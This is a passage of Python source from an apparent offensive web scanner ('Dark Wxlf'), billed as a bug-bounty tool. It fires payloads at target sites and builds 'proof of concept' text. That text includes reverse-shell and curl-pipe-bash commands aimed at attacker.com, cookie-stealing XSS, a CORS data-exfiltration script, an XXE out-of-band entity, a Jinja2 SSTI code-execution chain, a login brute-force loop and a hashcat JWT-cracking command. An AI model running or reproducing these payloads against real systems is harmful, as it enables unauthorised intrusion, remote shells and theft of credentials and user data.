                            r = requests.get(test_url, timeout=10, verify=False)
                            elapsed = time.time() - start
                            
                            # check for command output or timing attacks
                            cmd_indicators = ['root:', 'uid=', 'gid=', '/bin/', 'daemon']
                            
                            if any(ind in r.text for ind in cmd_indicators):
                                vuln = {
                                    'type': 'Command Injection',
                                    'severity': 'CRITICAL',
                                    'url': test_url,
                                    'param': param,
                                    'payload': payload,
                                    'evidence': 'Command output in response',
                                    'impact': 'Full system compromise, RCE',
                                    'fix': 'Never pass user input to shell commands',
                                    'poc': self.cmd_injection_poc(test_url, param, payload),
                                    'cvss': '10.0 CRITICAL'
                                }
                                found.append(vuln)
                                self.log(f"CMD INJECTION found: {base}", "success")
                                break
                            
                            # timing based detection for sleep payloads
                            if 'sleep' in payload and elapsed > 4:
                                vuln = {
                                    'type': 'Command Injection (Blind)',
                                    'severity': 'CRITICAL',
                                    'url': test_url,
                                    'param': param,
                                    'payload': payload,
                                    'evidence': f'Response delayed {elapsed:.1f}s',
                                    'impact': 'Remote code execution',
                                    'fix': 'Input validation, avoid system calls',
                                    'poc': self.cmd_injection_poc(test_url, param, payload),
                                    'cvss': '9.8 CRITICAL'
                                }
                                found.append(vuln)
                                self.log(f"Blind CMD injection: {base}", "success")
                                break
                        except:
                            pass
        
        self.log(f"Command injection tests done: {len(found)} findings", "success")
        return found
    
    def test_path_traversal(self):
        self.log("Testing for path traversal / LFI...", "info")
        
        found = []
        trav_payloads = [
            '../../../etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '....//....//....//etc/passwd',
            '..//..//..//etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '/etc/passwd',
            'file:///etc/passwd'
        ]
        
        file_params = ['file', 'path', 'page', 'doc', 'template', 'include', 'read']
        
        for ep in self.endpoints[:25]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                if any(fp in param.lower() for fp in file_params):
                    for payload in trav_payloads:
                        try:
                            base = ep.split('?')[0]
                            test_url = f"{base}?{param}={payload}"
                            
                            r = requests.get(test_url, timeout=5, verify=False)
                            
                            # check if we got file contents
                            file_sigs = ['root:', 'daemon:', '[extensions]', 'for 16-bit']
                            
                            if any(sig in r.text for sig in file_sigs):
                                vuln = {
                                    'type': 'Path Traversal / LFI',
                                    'severity': 'HIGH',
                                    'url': test_url,
                                    'param': param,
                                    'payload': payload,
                                    'evidence': 'Sensitive file contents exposed',
                                    'impact': 'Source code disclosure, credentials leak',
                                    'fix': 'Whitelist files, validate input paths',
                                    'poc': self.path_traversal_poc(test_url, param, payload),
                                    'cvss': '7.5 HIGH'
                                }
                                found.append(vuln)
                                self.log(f"Path traversal: {base}", "success")
                                break
                        except:
                            pass
        
        self.log(f"Path traversal tests done: {len(found)} findings", "success")
        return found
    
    def test_sensitive_files(self):
        self.log("Testing for exposed sensitive files...", "info")
        
        found = []
        
        # common sensitive files/dirs
        sensitive = [
            '.git/config',
            '.env',
            '.env.production',
            'config.php',
            'web.config',
            'database.yml',
            'phpinfo.php',
            '.DS_Store',
            'backup.sql',
            'dump.sql',
            '.htaccess',
            'wp-config.php',
            'api_keys.txt',
            'secrets.json',
            'id_rsa',
            '.ssh/id_rsa',
            'server.key'
        ]
        
        for app in self.data.get('web_apps', [])[:15]:
            url = app['url']
            
            for file in sensitive:
                try:
                    test = f"{url}/{file}"
                    r = requests.get(test, timeout=5, verify=False)
                    
                    # check if file exists and has content
                    if r.status_code == 200 and len(r.text) > 10:
                        # verify it's not just error page
                        if 'not found' not in r.text.lower() and 'error' not in r.text.lower()[:100]:
                            vuln = {
                                'type': 'Sensitive Data Exposure',
                                'severity': 'HIGH' if any(k in file for k in ['key', 'secret', 'password', 'rsa']) else 'MEDIUM',
                                'url': test,
                                'param': 'Direct file access',
                                'payload': file,
                                'evidence': f'{file} is publicly accessible',
                                'impact': 'Credentials leak, source code exposure',
                                'fix': 'Remove sensitive files, configure web server properly',
                                'poc': self.sensitive_file_poc(test, file),
                                'cvss': '7.5 HIGH'
                            }
                            found.append(vuln)
                            self.log(f"Exposed file: {test}", "success")
                except:
                    pass
        
        self.log(f"Sensitive file tests done: {len(found)} findings", "success")
        return found
    
    def test_cors(self):
        self.log("Testing for CORS misconfigurations...", "info")
        
        found = []
        
        for app in self.data.get('web_apps', [])[:20]:
            url = app['url']
            
            try:
                # test with evil origin
                r = requests.get(
                    url,
                    headers={'Origin': 'https://evil.com'},
                    timeout=5,
                    verify=False
                )
                
                acao = r.headers.get('Access-Control-Allow-Origin', '')
                acac = r.headers.get('Access-Control-Allow-Credentials', '')
                
                # check for dangerous configs
                if acao == '*':
                    vuln = {
                        'type': 'CORS Misconfiguration',
                        'severity': 'MEDIUM',
                        'url': url,
                        'param': 'CORS headers',
                        'payload': 'Origin: https://evil.com',
                        'evidence': 'Access-Control-Allow-Origin: *',
                        'impact': 'Cross-origin data theft',
                        'fix': 'Whitelist specific origins',
                        'poc': self.cors_poc(url),
                        'cvss': '5.3 MEDIUM'
                    }
                    found.append(vuln)
                    self.log(f"CORS wildcard: {url}", "success")
                
                # even worse - reflecting origin with credentials
                if 'evil.com' in acao and 'true' in acac.lower():
                    vuln = {
                        'type': 'CORS Misconfiguration (Critical)',
                        'severity': 'HIGH',
                        'url': url,
                        'param': 'CORS headers',
                        'payload': 'Origin: https://evil.com',
                        'evidence': 'Arbitrary origin reflected with credentials',
                        'impact': 'Full account compromise via CORS',
                        'fix': 'Strict origin whitelist, remove credentials flag',
                        'poc': self.cors_poc(url),
                        'cvss': '8.1 HIGH'
                    }
                    found.append(vuln)
                    self.log(f"CRITICAL CORS: {url}", "success")
            except:
                pass
        
        self.log(f"CORS tests done: {len(found)} findings", "success")
        return found
    
    def test_security_headers(self):
        self.log("Checking security headers...", "info")
        
        found = []
        
        for app in self.data.get('web_apps', [])[:20]:
            url = app['url']
            missing = []
            
            try:
                r = requests.get(url, timeout=5, verify=False)
                headers = r.headers
                
                # check critical security headers
                if 'X-Frame-Options' not in headers:
                    missing.append('X-Frame-Options (clickjacking protection)')
                
                if 'Content-Security-Policy' not in headers:
                    missing.append('Content-Security-Policy (XSS protection)')
                
                if 'Strict-Transport-Security' not in headers and url.startswith('https'):
                    missing.append('HSTS (force HTTPS)')
                
                if 'X-Content-Type-Options' not in headers:
                    missing.append('X-Content-Type-Options (MIME sniffing)')
                
                if missing:
                    vuln = {
                        'type': 'Missing Security Headers',
                        'severity': 'LOW',
                        'url': url,
                        'param': 'HTTP headers',
                        'payload': 'N/A',
                        'evidence': f"Missing: {', '.join(missing)}",
                        'impact': 'Increased attack surface',
                        'fix': 'Add security headers to web server config',
                        'poc': self.sec_headers_poc(url, missing),
                        'cvss': '3.7 LOW'
                    }
                    found.append(vuln)
                    self.log(f"Missing headers: {url}", "warning")
            except:
                pass
        
        self.log(f"Security header tests done: {len(found)} findings", "success")
        return found
    
    def test_rate_limiting(self):
        self.log("Testing rate limiting...", "info")
        
        found = []
        
        # test login endpoints
        login_paths = ['/login', '/api/login', '/signin', '/auth/login']
        
        for app in self.data.get('web_apps', [])[:10]:
            url = app['url']
            
            for path in login_paths:
                try:
                    test_url = url + path
                    
                    # try 10 rapid requests
                    count = 0
                    for i in range(10):
                        r = requests.post(
                            test_url,
                            data={'user': 'test', 'pass': 'test'},
                            timeout=3,
                            verify=False
                        )
                        if r.status_code != 429:  # not rate limited
                            count += 1
                    
                    # if we got more than 5 through, rate limiting is weak
                    if count > 5:
                        vuln = {
                            'type': 'Missing Rate Limiting',
                            'severity': 'MEDIUM',
                            'url': test_url,
                            'param': 'Request rate',
                            'payload': '10 rapid requests',
                            'evidence': f'{count}/10 requests succeeded',
                            'impact': 'Brute force attacks, credential stuffing',
                            'fix': 'Implement rate limiting on authentication endpoints',
                            'poc': self.rate_limit_poc(test_url),
                            'cvss': '5.3 MEDIUM'
                        }
                        found.append(vuln)
                        self.log(f"Weak rate limiting: {test_url}", "success")
                except:
                    pass
        
        self.log(f"Rate limiting tests done: {len(found)} findings", "success")
        return found
    
    def test_crlf(self):
        self.log("Testing for CRLF injection...", "info")
        
        found = []
        crlf_payloads = [
            '%0d%0aSet-Cookie:test=evil',
            '%0aSet-Cookie:injected=true',
            '%0d%0aLocation:https://evil.com'
        ]
        
        for ep in self.endpoints[:20]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                for payload in crlf_payloads:
                    try:
                        base = ep.split('?')[0]
                        test_url = f"{base}?{param}={payload}"
                        
                        r = requests.get(test_url, timeout=5, verify=False, allow_redirects=False)
                        
                        # check if we injected headers
                        if 'Set-Cookie' in r.headers and 'test=evil' in r.headers.get('Set-Cookie', ''):
                            vuln = {
                                'type': 'CRLF Injection',
                                'severity': 'MEDIUM',
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': 'Successfully injected HTTP headers',
                                'impact': 'Session fixation, XSS, cache poisoning',
                                'fix': 'Sanitize CRLF characters from input',
                                'poc': self.crlf_poc(test_url, param, payload),
                                'cvss': '6.5 MEDIUM'
                            }
                            found.append(vuln)
                            self.log(f"CRLF injection: {base}", "success")
                            break
                    except:
                        pass
        
        self.log(f"CRLF tests done: {len(found)} findings", "success")
        return found
    
    def test_graphql(self):
        self.log("Testing GraphQL endpoints...", "info")
        
        found = []
        graphql_paths = ['/graphql', '/api/graphql', '/v1/graphql', '/gql']
        
        # introspection query to dump schema
        intro_query = '{"query": "{__schema{types{name,fields{name}}}}"}'
        
        for app in self.data.get('web_apps', [])[:10]:
            url = app['url']
            
            for path in graphql_paths:
                try:
                    test_url = url + path
                    
                    r = requests.post(
                        test_url,
                        data=intro_query,
                        headers={'Content-Type': 'application/json'},
                        timeout=5,
                        verify=False
                    )
                    
                    # check if introspection worked
                    if r.status_code == 200 and '__schema' in r.text:
                        vuln = {
                            'type': 'GraphQL Introspection Enabled',
                            'severity': 'MEDIUM',
                            'url': test_url,
                            'param': 'GraphQL query',
                            'payload': intro_query,
                            'evidence': 'Full schema disclosed via introspection',
                            'impact': 'API enumeration, hidden field discovery',
                            'fix': 'Disable introspection in production',
                            'poc': self.graphql_poc(test_url),
                            'cvss': '5.3 MEDIUM'
                        }
                        found.append(vuln)
                        self.log(f"GraphQL introspection: {test_url}", "success")
                except:
                    pass
        
        self.log(f"GraphQL tests done: {len(found)} findings", "success")
        return found
    
    def test_jwt(self):
        self.log("Testing JWT vulnerabilities...", "info")
        
        found = []
        
        for app in self.data.get('web_apps', [])[:15]:
            url = app['url']
            
            try:
                # try to get a JWT token
                r = requests.get(url, timeout=5, verify=False)
                
                # look for JWT in headers or cookies
                auth = r.headers.get('Authorization', '')
                cookies = r.cookies
                
                token = None
                if 'eyJ' in auth:  # JWT starts with eyJ
                    token = auth.replace('Bearer ', '')
                
                for cookie in cookies:
                    if 'eyJ' in cookies[cookie]:
                        token = cookies[cookie]
                
                if token:
                    # try to decode and check alg
                    try:
                        parts = token.split('.')
                        if len(parts) == 3:
                            header = json.loads(base64.b64decode(parts[0] + '=='))
                            
                            # check for weak alg
                            alg = header.get('alg', '')
                            
                            if alg == 'none':
                                vuln = {
                                    'type': 'JWT None Algorithm',
                                    'severity': 'CRITICAL',
                                    'url': url,
                                    'param': 'JWT token',
                                    'payload': token[:50] + '...',
                                    'evidence': 'JWT accepts "none" algorithm',
                                    'impact': 'Authentication bypass, privilege escalation',
                                    'fix': 'Reject "none" algorithm, enforce strong signing',
                                    'poc': self.jwt_poc(url, token),
                                    'cvss': '9.8 CRITICAL'
                                }
                                found.append(vuln)
                                self.log(f"JWT none alg: {url}", "success")
                            
                            elif alg in ['HS256', 'HS384', 'HS512']:
                                # weak secret testing could go here
                                vuln = {
                                    'type': 'JWT Weak Secret (Potential)',
                                    'severity': 'MEDIUM',
                                    'url': url,
                                    'param': 'JWT token',
                                    'payload': token[:50] + '...',
                                    'evidence': f'Uses HMAC algorithm: {alg}',
                                    'impact': 'Token forgery if secret is weak',
                                    'fix': 'Use strong secret, consider RSA algorithms',
                                    'poc': self.jwt_poc(url, token),
                                    'cvss': '6.5 MEDIUM'
                                }
                                found.append(vuln)
                                self.log(f"JWT HMAC detected: {url}", "warning")
                    except:
                        pass
            except:
                pass
        
        self.log(f"JWT tests done: {len(found)} findings", "success")
        return found
    
    def test_subdomain_takeover(self):
        self.log("Testing for subdomain takeover...", "info")
        
        found = []
        
        # signatures of takeover-able services
        takeover_sigs = {
            'github.io': 'There isn\'t a GitHub Pages site here',
            'herokuapp.com': 'No such app',
            'amazo': 'NoSuchBucket',
            's3.amazonaws': 'NoSuchBucket',
            'cloudfront': 'The request could not be satisfied',
            'azure': '404 Web Site not found',
            'tumblr': 'Whatever you were looking for doesn\'t currently exist'
        }
        
        for sub in list(self.subdomains)[:30]:
            try:
                # try to resolve
                ip = socket.gethostbyname(sub)
                
                # try to fetch the site
                for scheme in ['https', 'http']:
                    try:
                        r = requests.get(f"{scheme}://{sub}", timeout=5, verify=False)
                        
                        # check for takeover signatures
                        for service, sig in takeover_sigs.items():
                            if sig.lower() in r.text.lower():
                                vuln = {
                                    'type': 'Subdomain Takeover',
                                    'severity': 'HIGH',
                                    'url': f"{scheme}://{sub}",
                                    'param': 'DNS/hosting',
                                    'payload': sub,
                                    'evidence': f'Service: {service}, signature: {sig}',
                                    'impact': 'Phishing, malware distribution, cookie theft',
                                    'fix': 'Remove DNS record or reclaim service',
                                    'poc': self.subdomain_takeover_poc(sub, service),
                                    'cvss': '7.5 HIGH'
                                }
                                found.append(vuln)
                                self.log(f"TAKEOVER possible: {sub}", "success")
                                break
                    except:
                        pass
            except socket.gaierror:
                # subdomain doesn't resolve - check if it's registered on services
                for service in takeover_sigs.keys():
                    if service in sub:
                        vuln = {
                            'type': 'Subdomain Takeover (Dangling DNS)',
                            'severity': 'HIGH',
                            'url': f'https://{sub}',
                            'param': 'DNS record',
                            'payload': sub,
                            'evidence': f'DNS points to {service} but doesn\'t resolve',
                            'impact': 'Domain hijacking possible',
                            'fix': 'Remove DNS record immediately',
                            'poc': self.subdomain_takeover_poc(sub, service),
                            'cvss': '8.1 HIGH'
                        }
                        found.append(vuln)
                        self.log(f"Dangling DNS: {sub}", "success")
            except:
                pass
        
        self.log(f"Subdomain takeover tests done: {len(found)} findings", "success")
        return found
    
    def test_ssti(self):
        self.log("Testing for SSTI (Server-Side Template Injection)...", "info")
        
        found = []
        
        # SSTI payloads for different template engines
        ssti_payloads = [
            '{{7*7}}',  # Jinja2/Twig
            '${7*7}',   # Freemarker
            '<%= 7*7 %>', # ERB
            '#{7*7}',   # Ruby
            '${{7*7}}'  # Various
        ]
        
        for ep in self.endpoints[:20]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                for payload in ssti_payloads:
                    try:
                        base = ep.split('?')[0]
                        test_url = f"{base}?{param}={payload}"
                        
                        r = requests.get(test_url, timeout=5, verify=False)
                        
                        # check if our math was evaluated (7*7=49)
                        if '49' in r.text and payload not in r.text:
                            vuln = {
                                'type': 'SSTI (Server-Side Template Injection)',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': 'Template expression evaluated to 49',
                                'impact': 'Remote Code Execution, full server compromise',
                                'fix': 'Sanitize template input, use sandboxed environments',
                                'poc': self.ssti_poc(test_url, param, payload),
                                'cvss': '9.8 CRITICAL'
                            }
                            found.append(vuln)
                            self.log(f"SSTI found: {base}", "success")
                            break
                    except:
                        pass
        
        self.log(f"SSTI tests done: {len(found)} findings", "success")
        return found
    
    def test_host_header(self):
        self.log("Testing for Host header injection...", "info")
        
        found = []
        
        for app in self.data.get('web_apps', [])[:15]:
            url = app['url']
            
            try:
                # test with evil host header
                r = requests.get(
                    url,
                    headers={'Host': 'evil.com'},
                    timeout=5,
                    verify=False,
                    allow_redirects=False
                )
                
                # check if our host is reflected
                if 'evil.com' in r.text or 'evil.com' in str(r.headers):
                    vuln = {
                        'type': 'Host Header Injection',
                        'severity': 'MEDIUM',
                        'url': url,
                        'param': 'Host header',
                        'payload': 'Host: evil.com',
                        'evidence': 'Malicious host header reflected',
                        'impact': 'Password reset poisoning, cache poisoning, SSRF',
                        'fix': 'Validate Host header, use absolute URLs',
                        'poc': self.host_header_poc(url),
                        'cvss': '6.5 MEDIUM'
                    }
                    found.append(vuln)
                    self.log(f"Host header injection: {url}", "success")
            except:
                pass
        
        self.log(f"Host header tests done: {len(found)} findings", "success")
        return found
    
    def test_websocket(self):
        self.log("Testing WebSocket security...", "info")
        
        found = []
        ws_paths = ['/ws', '/websocket', '/socket', '/chat']
        
        for app in self.data.get('web_apps', [])[:10]:
            url = app['url']
            
            for path in ws_paths:
                try:
                    # check if websocket endpoint exists
                    ws_url = url.replace('https://', 'wss://').replace('http://', 'ws://') + path
                    
                    # try to connect with evil origin
                    headers = {'Origin': 'https://evil.com'}
                    
                    # note: actual WS testing would need websocket library
                    # this is a simplified check
                    r = requests.get(
                        url + path,
                        headers=headers,
                        timeout=5,
                        verify=False
                    )
                    
                    # check if endpoint responds
                    if r.status_code in [101, 200, 426]:
                        vuln = {
                            'type': 'WebSocket Security Issue',
                            'severity': 'MEDIUM',
                            'url': ws_url,
                            'param': 'WebSocket connection',
                            'payload': 'Origin: https://evil.com',
                            'evidence': 'WebSocket endpoint doesn\'t validate origin',
                            'impact': 'Cross-site WebSocket hijacking',
                            'fix': 'Validate Origin header, use tokens',
                            'poc': self.websocket_poc(ws_url),
                            'cvss': '6.5 MEDIUM'
                        }
                        found.append(vuln)
                        self.log(f"WebSocket issue: {ws_url}", "success")
                except:
                    pass
        
        self.log(f"WebSocket tests done: {len(found)} findings", "success")
        return found
    
    # PoC generators for original vulns
    def xss_poc(self, url, param, payload):
        return f"""
XSS Proof of Concept
====================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Go to: {url.split('?')[0]}
2. Set '{param}' to: {payload}
3. Check browser console for alert()

Exploitation:
{url.split('?')[0]}?{param}=<script>fetch('https://attacker.com?c='+document.cookie)</script>

Fix:
- HTML encode output
- Use CSP headers
- HTTPOnly cookies
"""
    
    def sqli_poc(self, url, param, payload):
        return f"""
SQL Injection PoC
=================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Access: {url}
2. Check for SQL errors
3. Run: sqlmap -u "{url.split('?')[0]}?{param}=1" -p {param} --dbs

Advanced:
' UNION SELECT schema_name FROM information_schema.schemata--
' UNION SELECT username,password FROM users--

Fix:
- Use prepared statements
- Never concat user input into SQL
"""
    
    def idor_poc(self, url, param):
        return f"""
IDOR Proof of Concept
=====================
URL: {url}
Param: {param}

Steps:
1. Login as User A
2. Access: {url}
3. Note {param} value (e.g., {param}=123)
4. Change to {param}=124
5. Access User B's data (unauthorized)

Fix:
- Check user owns resource
- Use indirect reference maps
"""
    
    def ssrf_poc(self, url, param, payload):
        return f"""
SSRF Proof of Concept
=====================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Set {param} to: {payload}
2. Server makes internal request
3. Try AWS metadata: http://169.254.169.254/latest/meta-data/

Fix:
- Whitelist domains
- Block private IPs
"""
    
    def redir_poc(self, url, param):
        return f"""
Open Redirect PoC
=================
URL: {url}
Param: {param}

Phishing:
{url.split('?')[0]}?{param}=https://fake-{self.target}.com/login

Fix:
- Whitelist destinations
- Validate URLs
"""
    
    # NEW PoC GENERATORS
    
    def xxe_poc(self, url):
        return f"""
XXE Proof of Concept
====================
URL: {url}

Payload:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

Steps:
1. Send POST to {url}
2. Content-Type: application/xml
3. Include XXE payload in body
4. Server reads /etc/passwd

Advanced:
- Read source code: file:///var/www/html/config.php
- SSRF: http://internal-server/admin
- Out-of-band: <!ENTITY xxe SYSTEM "http://attacker.com/collect?data=...">

Fix:
- Disable external entities
- Use less complex data formats (JSON)
"""
    
    def cmd_injection_poc(self, url, param, payload):
        return f"""
Command Injection PoC
=====================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Inject: {url.split('?')[0]}?{param}={payload}
2. Server executes system command
3. Output may be visible in response

Exploitation:
{url.split('?')[0]}?{param}=; nc attacker.com 4444 -e /bin/sh
{url.split('?')[0]}?{param}=`curl http://attacker.com/shell.sh | bash`

Fix:
- Never pass user input to shell
- Use safe APIs instead of system()
- Input validation with whitelist
"""
    
    def path_traversal_poc(self, url, param, payload):
        return f"""
Path Traversal PoC
==================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Access: {url}
2. File contents are disclosed
3. Try other files: ../../../etc/shadow

Targets:
- /etc/passwd (Linux users)
- /etc/shadow (password hashes)
- /var/www/html/config.php (app configs)
- C:\\windows\\win.ini (Windows)

Fix:
- Whitelist allowed files
- Use file IDs instead of paths
- chroot jail the application
"""
    
    def sensitive_file_poc(self, url, file):
        return f"""
Sensitive File Exposure
=======================
URL: {url}
File: {file}

Steps:
1. Access: {url}
2. File is publicly accessible
3. Review contents for secrets

Impact:
- Credentials in .env files
- Source code disclosure
- Database dumps
- Private keys

Fix:
- Remove sensitive files from web root
- Configure web server to block dotfiles
- Use .gitignore properly
"""
    
    def cors_poc(self, url):
        return f"""
CORS Misconfiguration PoC
=========================
URL: {url}

HTML Exploit:
<script>
fetch('{url}', {{
  credentials: 'include'
}})
.then(r => r.text())
.then(data => {{
  fetch('https://attacker.com/steal?data=' + btoa(data));
}});
</script>

Steps:
1. Victim visits attacker site
2. JavaScript makes authenticated request
3. Response is stolen

Fix:
- Whitelist specific origins
- Don't reflect arbitrary origins
- Remove Access-Control-Allow-Credentials if not needed
"""
    
    def sec_headers_poc(self, url, missing):
        return f"""
Missing Security Headers
========================
URL: {url}
Missing: {', '.join(missing)}

Impact:
- No X-Frame-Options = Clickjacking
- No CSP = XSS attacks easier
- No HSTS = MITM attacks
- No X-Content-Type-Options = MIME confusion

Fix in Nginx:
add_header X-Frame-Options "SAMEORIGIN";
add_header Content-Security-Policy "default-src 'self'";
add_header Strict-Transport-Security "max-age=31536000";
add_header X-Content-Type-Options "nosniff";

Fix in Apache:
Header always set X-Frame-Options "SAMEORIGIN"
Header always set Content-Security-Policy "default-src 'self'"
"""
    
    def rate_limit_poc(self, url):
        return f"""
Rate Limiting Bypass
====================
URL: {url}

Attack:
for i in {{1..1000}}; do
  curl -X POST {url} -d "user=admin&pass=$i" &
done

Impact:
- Brute force passwords
- Credential stuffing
- Account enumeration
- DoS

Fix:
- Limit requests per IP: 5 per minute
- Implement account lockout
- Use CAPTCHA after failures
- Monitor for suspicious patterns
"""
    
    def crlf_poc(self, url, param, payload):
        return f"""
CRLF Injection PoC
==================
URL: {url}
Param: {param}
Payload: {payload}

Exploitation:
{url.split('?')[0]}?{param}=%0d%0aSet-Cookie:session=hacked

Impact:
- HTTP Response Splitting
- Session fixation
- XSS via injected headers
- Cache poisoning

Fix:
- Strip \\r and \\n from input
- Use URL encoding properly
- Don't reflect user input in headers
"""
    
    def graphql_poc(self, url):
        return f"""
GraphQL Introspection PoC
=========================
URL: {url}

Query to dump schema:
{{
  __schema {{
    types {{
      name
      fields {{
        name
        type {{
          name
        }}
      }}
    }}
  }}
}}

Steps:
1. POST to {url}
2. Include introspection query
3. Enumerate all types and fields
4. Find hidden/admin queries

Fix:
- Disable introspection in production
- Use query depth limiting
- Implement authentication
"""
    
    def jwt_poc(self, url, token):
        return f"""
JWT Vulnerability PoC
=====================
URL: {url}
Token: {token[:50]}...

Attack - None Algorithm:
1. Decode JWT header
2. Change "alg" to "none"
3. Remove signature
4. Use modified token

Attack - Weak Secret:
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

Fix:
- Reject "none" algorithm
- Use strong secrets (32+ chars)
- Consider RS256 instead of HS256
- Validate signature properly
"""
    
    def subdomain_takeover_poc(self, subdomain, service):
        return f"""
Subdomain Takeover PoC
======================
Subdomain: {subdomain}
Service: {service}

Steps:
1. DNS points to {service}
2. Service account is unclaimed
3. Register account on {service}
4. Point to your content
5. Subdomain now under attacker control

Impact:
- Phishing campaigns
- Malware distribution
- Cookie theft (same parent domain)
- SEO poisoning

Fix:
- Remove DNS record immediately
- Monitor for dangling records
- Reclaim service if possible
"""
    
    def ssti_poc(self, url, param, payload):
        return f"""
SSTI Proof of Concept
=====================
URL: {url}
Param: {param}
Payload: {payload}

Exploitation (Jinja2):
{{{{ config.items() }}}}
{{{{ ''.__class__.__mro__[1].__subclasses__() }}}}
{{{{ ''.__class__.__mro__[1].__subclasses__()[401]('whoami',shell=True,stdout=-1).communicate()[0].strip() }}}}

Steps:
1. Inject template expression
2. Server evaluates it
3. Achieve RCE

Fix:
- Never pass user input to template engine
- Use sandboxed environments
- Escape template syntax
"""
    
    def host_header_poc(self, url):
        return f"""
Host Header Injection PoC
=========================
URL: {url}

Attack:
POST /reset-password
Host: evil.com
...

email=victim@example.com

Impact:
- Password reset emails go to evil.com
- Cache poisoning
- SSRF
- Virtual host confusion

Fix:
- Validate Host header against whitelist
- Use absolute URLs in emails
- Don't trust Host header for routing
"""
    
    def websocket_poc(self, url):
        return f"""
WebSocket Security Issue
========================
URL: {url}

Attack:
<script>
var ws = new WebSocket('{url}');
ws.onopen = function() {{
  ws.send(JSON.stringify({{
    action: 'adminCommand',
    data: 'malicious'
  }}));
}};
</script>

Impact:
- Cross-site WebSocket hijacking
- Unauthorized actions
- Real-time data theft

Fix:
- Validate Origin header
- Use authentication tokens
- Implement CSRF tokens
"""
    
    def nuclei_poc(self, data):
        """Generate PoC from nuclei finding"""
        template_id = data.get('template-id', 'unknown')
        matched = data.get('matched-at', '')
        
        return f"""
Nuclei Detection
================
Template: {template_id}
Matched At: {matched}

Description:
{data.get('info', {}).get('description', 'No description')}

Severity: {data.get('info', {}).get('severity', 'unknown').upper()}

Reference:
{data.get('info', {}).get('reference', 'See Nuclei documentation')}

Remediation:
{data.get('info', {}).get('remediation', 'Check vendor security advisories')}

More Info:
https://github.com/projectdiscovery/nuclei-templates
"""
    
    def make_report(self, findings):
        self.log("\nGenerating reports...", "info")
        
        if not findings:
            self.log("No findings to report", "warning")
            return
        
        # sort by severity
        sev_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'UNKNOWN': 4}
        findings.sort(key=lambda x: sev_order.get(x['severity'], 99))
        
        # count by severity
        crit = len([f for f in findings if f['severity'] == 'CRITICAL'])
        high = len([f for f in findings if f['severity'] == 'HIGH'])
        med = len([f for f in findings if f['severity'] == 'MEDIUM'])
        low = len([f for f in findings if f['severity'] == 'LOW'])
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Generate each requested format
        generated_files = []
        
        if 'txt' in self.output_formats:
            txt_file = self.generate_txt_report(findings, crit, high, med, low, timestamp)
            if txt_file:
                generated_files.append(txt_file)
        
        if 'json' in self.output_formats:
            json_file = self.generate_json_report(findings, crit, high, med, low, timestamp)
            if json_file:
                generated_files.append(json_file)
        
        if 'html' in self.output_formats:
            html_file = self.generate_html_report(findings, crit, high, med, low, timestamp)
            if html_file:
                generated_files.append(html_file)
        
        # Print summary
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                     RESULTS SUMMARY                            ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        print(colored(f"Total Findings: {len(findings)}", 'yellow', attrs=['bold']))
        print(colored(f"Critical: {crit} | High: {high} | Medium: {med} | Low: {low}", 'yellow'))
        print()
        print(colored("Generated Reports:", 'green', attrs=['bold']))
        for f in generated_files:
            print(colored(f"  ✓ {f}", 'green'))
    
    def generate_txt_report(self, findings, crit, high, med, low, timestamp):
        """Generate text report"""
        lines = []
        lines.append("=" * 80)
        lines.append("DARK WXLF - COMPREHENSIVE BUG BOUNTY REPORT")
        lines.append(f"By: GhxstSh3ll")
        lines.append(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"Target: {self.target}")
        if self.waf_detected:
            lines.append(f"WAF Detected: {', '.join(self.waf_detected)}")
        lines.append("=" * 80)
        lines.append("")
        
        lines.append("EXECUTIVE SUMMARY")
        lines.append("-" * 80)
        lines.append(f"Total Vulnerabilities Found: {len(findings)}")
        lines.append(f"Critical: {crit}")
        lines.append(f"High: {high}")
        lines.append(f"Medium: {med}")
        lines.append(f"Low: {low}")
        lines.append("")
        
        for i, f in enumerate(findings, 1):
            lines.append("=" * 80)
            lines.append(f"FINDING #{i}: {f['type']}")
            lines.append("=" * 80)
            lines.append(f"Severity: {f['severity']} | CVSS: {f.get('cvss', 'N/A')}")
            lines.append(f"URL: {f['url']}")
            lines.append(f"Parameter: {f['param']}")
            lines.append(f"Payload: {f['payload']}")
            lines.append("")
            lines.append(f"Evidence: {f['evidence']}")
            lines.append(f"Impact: {f['impact']}")
            lines.append(f"Remediation: {f['fix']}")
            lines.append("")
            lines.append("Proof of Concept:")
            lines.append(f['poc'])
            lines.append("")
        
        fname = f"bug_bounty_report_{self.target}_{timestamp}.txt"
        with open(fname, 'w') as file:
            file.write('\n'.join(lines))
        
        self.log(f"TXT report saved: {fname}", "success")
        return fname
    
    def generate_json_report(self, findings, crit, high, med, low, timestamp):
        """Generate JSON report for tool integration"""
        report = {
            'scan_info': {
                'tool': 'Dark Wxlf',
                'author': 'GhxstSh3ll',
                'target': self.target,
                'timestamp': datetime.now().isoformat(),
                'waf_detected': self.waf_detected
            },
            'summary': {
                'total': len(findings),
                'critical': crit,
                'high': high,
                'medium': med,
                'low': low
            },
            'findings': []
        }
        
        for i, f in enumerate(findings, 1):
            finding = {
                'id': i,
